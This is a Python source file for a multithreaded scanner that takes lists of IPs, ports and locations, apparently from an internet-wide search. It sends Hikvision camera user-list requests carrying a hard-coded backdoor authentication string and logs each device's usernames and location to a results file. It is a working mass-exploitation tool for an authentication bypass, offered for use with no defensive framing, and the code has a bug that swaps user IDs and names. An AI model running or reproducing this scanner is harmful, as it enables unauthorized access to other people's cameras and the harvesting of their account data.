import requests
import json
from xml.etree import ElementTree as ET
import concurrent.futures
import os
from datetime import datetime

class HikVisionScanner:
    BACKDOOR_AUTH_ARG = "auth=YWRmaW46MTEK"
    NAMESPACE = {'ns': 'http://www.hikvision.com/ver10/XMLSchema'}
    MAX_PORTS_PER_IP = 50

    @staticmethod
    def get_url_base(cb_https, txt_ip, nud_port):
        scheme = "https" if cb_https else "http"
        return f"{scheme}://{txt_ip}:{nud_port}/"

    @staticmethod
    def process_users_response(file, response, ip, port, country, city):
        if response.status_code != 200:
            print("An error occurred")
            return

        doc = ET.fromstring(response.content)
        users = doc.findall('.//ns:User', HikVisionScanner.NAMESPACE)

        user_ids = {}
        user_names = []
        for user in users:
            user_id = user.find('ns:userName', HikVisionScanner.NAMESPACE).text
            user_name = user.find('ns:id', HikVisionScanner.NAMESPACE).text
            user_ids[user_id] = user_name
            user_names.append(user_name)
        
        line = f"IP: {ip} PORT: {port} | USERS: {', '.join(user_ids)} | LOCATION: {country}, {city}\n"
        
        file.seek(0)
        if line not in file.read():
            file.write(line)
            file.flush()
            os.fsync(file.fileno())

    @staticmethod
    def get_users(file, cb_https, ip, port, country, city):
        try:
            url = HikVisionScanner.get_url_base(cb_https, ip, port) + "Security/users?" + HikVisionScanner.BACKDOOR_AUTH_ARG
            response = requests.get(url)
            HikVisionScanner.process_users_response(file, response, ip, port, country, city)
        except Exception as e:
            print(f"Error while connecting to {ip}:{port}, error: {e}")

    @staticmethod
    def get_users_in_threads(data):
        current_datetime = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        result_file_path = os.path.join("results", f"results-{current_datetime}.txt")

        with open(result_file_path, "a+") as file:
            with concurrent.futures.ThreadPoolExecutor() as executor:
                for item in data:
                    ip = item["ip"]
                    country = item["country"]
                    city = item["city"]
                    port_count = 0
                    for port in item["ports"]:
                        if port_count >= HikVisionScanner.MAX_PORTS_PER_IP:
                            print(f"Skipped remaining ports for IP: {ip}, as the maximum of {HikVisionScanner.MAX_PORTS_PER_IP} ports have already been processed.")
                            break
                        print(f"Trying IP: {ip}, port: {port}")
                        executor.submit(HikVisionScanner.get_users, file, False, ip, port, country, city)
                        port_count += 1

    @staticmethod
    def load_ips_and_ports(filename):
        with open(filename, "r", encoding="utf-8") as file:
            data = json.load(file)
        HikVisionScanner.get_users_in_threads(data)